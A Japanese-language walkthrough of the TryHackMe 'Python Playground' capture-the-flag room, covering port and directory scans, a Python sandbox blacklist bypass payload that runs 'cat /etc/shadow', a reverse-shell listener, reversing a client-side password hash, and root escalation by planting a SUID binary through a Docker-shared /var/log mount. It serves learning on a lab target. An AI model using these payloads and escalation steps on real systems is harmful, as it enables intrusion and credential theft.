# Python Playground CTF

https://tryhackme.com/room/pythonplayground

## Enumeration

```shell
TARGET=10.49.167.1
sudo bash -c "echo $TARGET   pp.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH、HTTPのみ。以外にもNode.js。

## Web

トップページ。ブラックリストの存在を明かしている。

```
Introducing the new era code sandbox; python playground! Normally, code playgrounds that execute code serverside are easy ways for hackers to access a system. Not anymore! With our new, foolproof blacklist, no one can break into our servers, and we can all enjoy the convenience of running our python code on the cloud!
```

login, signup ページ。

```
Sorry, but due to some recent security issues, only admins can use the site right now. Don't worry, the developers will fix it soon :)
```

### ディレクトリ列挙

```sh
dirsearch -u http://$TARGET/ -e py,js,txt

[01:38:02] 200 -    3KB - /admin.html
[01:38:31] 200 -  549B  - /login.htm
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,html,js,py -u http://$TARGET -w ./dirlist.txt -t 64 -k

/admin.html           (Status: 200) [Size: 3134]
/index.html           (Status: 200) [Size: 941]
/login.html           (Status: 200) [Size: 549]
/signup.html          (Status: 200) [Size: 549]
```

### admin.html

```
Connor's Secret Admin Backdoor
```

```js
// I suck at server side code, luckily I know how to make things secure without it - Connor

function string_to_int_array(str){
const intArr = [];

for(let i=0;i<str.length;i++){
    const charcode = str.charCodeAt(i);

    const partA = Math.floor(charcode / 26);
    const partB = charcode % 26;

    intArr.push(partA);
    intArr.push(partB);
}

return intArr;
}

function int_array_to_text(int_array){
let txt = '';

for(let i=0;i<int_array.length;i++){
    txt += String.fromCharCode(97 + int_array[i]);
}

return txt;
}

document.forms[0].onsubmit = function (e){
    e.preventDefault();

    if(document.getElementById('username').value !== 'connor'){
    document.getElementById('fail').style.display = '';
    return false;
    }

    const chosenPass = document.getElementById('inputPassword').value;

    const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

    if(hash === 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'){
    window.location = 'super-secret-admin-testing-panel.html';
    }else {
    document.getElementById('fail').style.display = '';
    }
    return false;
}
```

このパスワードを解析する必要があるかは不明。とりあえず先に進む。

## super-secret-admin-testing-panel.html

基本的なフィルターバイパスを試したら通った。  
実行ユーザーはrootだが、docker環境のため一般ユーザーは不在。

```python
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')
```

```
root:*:18375:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
messagebus:*:18398:0:99999:7:::

Exit code 0
```

リバースシェルを取得

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.129.39] from (UNKNOWN) [10.49.167.1] 56450
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

flag1 が入っていた。

```sh
root@playgroundweb:~/app# ls -al /root
total 40
drwx------ 1 root root 4096 May 16  2020 .
drwxr-xr-x 1 root root 4096 May 16  2020 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
drwx------ 3 root root 4096 May 16  2020 .config
drwxr-xr-x 4 root root 4096 May 16  2020 .npm
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 1 root root 4096 May 16  2020 app
-rw-rw-r-- 1 root root   38 May 16  2020 flag1.txt
```

dockerエスケープできるか調査したが、脆弱性は無いと判断。

## connor のパスワード

パスワードを解析して、ホストOSへのSSH接続を目指す。

javascript の動作を確認。

```js
string_to_int_array("abc")
(6) [3, 19, 3, 20, 3, 21]
```

```js
int_array_to_text([3, 19, 3, 20, 3, 21])
'dtdudv'
```

それぞれの逆関数を定義してパスワードを復元する。

```js
int_array_to_string(text_to_int_array(int_array_to_string(text_to_int_array('dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'))))
'[REDACTED]'
```

SSH接続成功。flag2を入手。

```sh
$ ssh connor@$TARGET

connor@pythonplayground:~
```

## 権限昇格

pspyで監視したが、定期的に起動されているプロセスは無い。

ローカル43339をリッスンしている。

```sh
connor@pythonplayground:~$ ss -nltp
State         Recv-Q         Send-Q                  Local Address:Port                  Peer Address:Port         
LISTEN        0              128                         127.0.0.1:43339                      0.0.0.0:*            
LISTEN        0              128                     127.0.0.53%lo:53                         0.0.0.0:*            
LISTEN        0              128                           0.0.0.0:22                         0.0.0.0:*            
LISTEN        0              128                                 *:80                               *:*            
LISTEN        0              128                              [::]:22                            [::]:*            
```

404を返しているのでHTTPサーバーが稼働していることが分かる。

```sh
connor@pythonplayground:~$ curl -v http://localhost:43339/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 43339 (#0)
> GET / HTTP/1.1
> Host: localhost:43339
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 404 Not Found
< Date: Fri, 27 Feb 2026 02:22:08 GMT
< Content-Length: 19
< Content-Type: text/plain; charset=utf-8
< 
* Connection #0 to host localhost left intact
404: Page Not Found
```

トンネリング

```sh
ssh -L 1080:localhost:80 connor@$TARGET
```

確認したらPythonPlaygroundだった。念のためRCEまで実行したが、flag1が入っているゲストOSだった。

ゲストOSとの共有ディレクトリを調べる。

```sh
root@playgroundweb:~/app# cat /proc/self/mountinfo
455 418 0:50 / / rw,relatime master:219 - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/VDCS7TOM6BIS74JWTPAWKU2FNH:/var/lib/docker/overlay2/l/EQFRTDYP4WKK7IS6FA6JZJYJZS:/var/lib/docker/overlay2/l/AFPQLM2KOWPDDTXIJ2PVECFPXP:/var/lib/docker/overlay2/l/AJWMG6OEA3IE3K6IRLU52BRAY2:/var/lib/docker/overlay2/l/YYGUJ44QJE6Z2DU6WU5MNAZWYD:/var/lib/docker/overlay2/l/YSACZNUE22DZZA3VEVYHCDKXCD:/var/lib/docker/overlay2/l/7KIFWHI6USVA4DMXYNIVZELYNX:/var/lib/docker/overlay2/l/KHQIDW6B5SJUVXGDYNJU5O4TJO:/var/lib/docker/overlay2/l/EZDDRBIBWJY4UCIWDYWJVEROAL:/var/lib/docker/overlay2/l/QM7YSDUXYHW77GIMJSV7I3BFUX:/var/lib/docker/overlay2/l/AM26LEYOAXL7RZGDRIEIRQOELR:/var/lib/docker/overlay2/l/QZ6EHBGDPA432GHCZJ5LEQI7ZB:/var/lib/docker/overlay2/l/67CK2ISEWP2DFEA6LFFK2KBBHV,upperdir=/var/lib/docker/overlay2/623124c6cb9d753da0473cf84447cfd22f30ab91751c2353fe448f0ddcaa04f3/diff,workdir=/var/lib/docker/overlay2/623124c6cb9d753da0473cf84447cfd22f30ab91751c2353fe448f0ddcaa04f3/work
456 455 0:65 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
457 455 0:66 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
458 457 0:67 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
459 455 0:68 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
460 459 0:69 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755
461 460 0:28 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/systemd ro,nosuid,nodev,noexec,relatime master:11 - cgroup cgroup rw,xattr,name=systemd
462 460 0:30 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/devices ro,nosuid,nodev,noexec,relatime master:14 - cgroup cgroup rw,devices
463 460 0:31 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/memory ro,nosuid,nodev,noexec,relatime master:15 - cgroup cgroup rw,memory
464 460 0:32 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexec,relatime master:16 - cgroup cgroup rw,cpuset
465 460 0:33 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec,relatime master:17 - cgroup cgroup rw,blkio
466 460 0:34 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noexec,relatime master:18 - cgroup cgroup rw,hugetlb
467 460 0:35 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/net_cls,net_prio ro,nosuid,nodev,noexec,relatime master:19 - cgroup cgroup rw,net_cls,net_prio
468 460 0:36 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,relatime master:20 - cgroup cgroup rw,pids
469 460 0:37 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/perf_event ro,nosuid,nodev,noexec,relatime master:21 - cgroup cgroup rw,perf_event
470 460 0:38 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,noexec,relatime master:22 - cgroup cgroup rw,cpu,cpuacct
471 460 0:39 /docker/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398 /sys/fs/cgroup/freezer ro,nosuid,nodev,noexec,relatime master:23 - cgroup cgroup rw,freezer
472 460 0:40 / /sys/fs/cgroup/rdma ro,nosuid,nodev,noexec,relatime master:24 - cgroup cgroup rw,rdma
473 457 0:64 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
474 457 0:70 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k
475 455 259:3 /var/log /mnt/log rw,relatime - ext4 /dev/nvme1n1p2 rw,data=ordered
476 455 259:3 /var/lib/docker/containers/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/nvme1n1p2 rw,data=ordered
477 455 259:3 /var/lib/docker/containers/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398/hostname /etc/hostname rw,relatime - ext4 /dev/nvme1n1p2 rw,data=ordered
478 455 259:3 /var/lib/docker/containers/6d91f91404d6f38f276161f0be6ce3c66209422a4048138ab310843aee065398/hosts /etc/hosts rw,relatime - ext4 /dev/nvme1n1p2 rw,data=ordered
419 456 0:65 /bus /proc/bus ro,relatime - proc proc rw
420 456 0:65 /fs /proc/fs ro,relatime - proc proc rw
421 456 0:65 /irq /proc/irq ro,relatime - proc proc rw
422 456 0:65 /sys /proc/sys ro,relatime - proc proc rw
423 456 0:65 /sysrq-trigger /proc/sysrq-trigger ro,relatime - proc proc rw
424 456 0:71 / /proc/acpi ro,relatime - tmpfs tmpfs ro
425 456 0:66 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
426 456 0:66 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
427 456 0:66 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
428 456 0:66 /null /proc/sched_debug rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
429 456 0:72 / /proc/scsi ro,relatime - tmpfs tmpfs ro
430 459 0:73 / /sys/firmware ro,relatime - tmpfs tmpfs ro
```

この部分に注目。

```
/var/log /mnt/log
```

ゲストOS側からbashをコピーし、SUIDを付ける。

```sh
root@playgroundweb:~/app# cp /usr/bin/bash /mnt/log
root@playgroundweb:~/app# chmod +s /mnt/log/bash
```

ホストOS側でみてもSUIDが付いている。

```sh
connor@pythonplayground:/$ ls -al /var/log
...
-rwsr-xr-x   1 root      root            1183448 Feb 27 02:45 bash                                                 
...
```

リンクエラー発生。

```sh
connor@pythonplayground:/$ /var/log/bash -p
/var/log/bash: error while loading shared libraries: libtinfo.so.6: cannot open shared object file: No such file or directory
connor@pythonplayground:/$ ldd /var/log/bash
        linux-vdso.so.1 (0x00007ffff97a9000)
        libtinfo.so.6 => not found
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1dd71c2000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1dd6dd1000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1dd73c6000)
```

代わりに cat コマンドをコピーしてflag3を直接読んだ。

```sh
connor@pythonplayground:/$ /var/log/cat /root/flag3.txt
THM{[REDACTED]}
```

## 振り返り

- Hard にしては簡単だった。体感的には、Easy から Medium レベル。
- docker共有ディレクトリを使った権限昇格は見慣れているが、ホストOS側からバイナリをコピーできないパターンは初めて。
- 今回は簡単に cat を使ったが、シェルを取ろうと思えばいくらでもやりようはある。

## Tags

#tags:フィルターバイパス #tags:docker
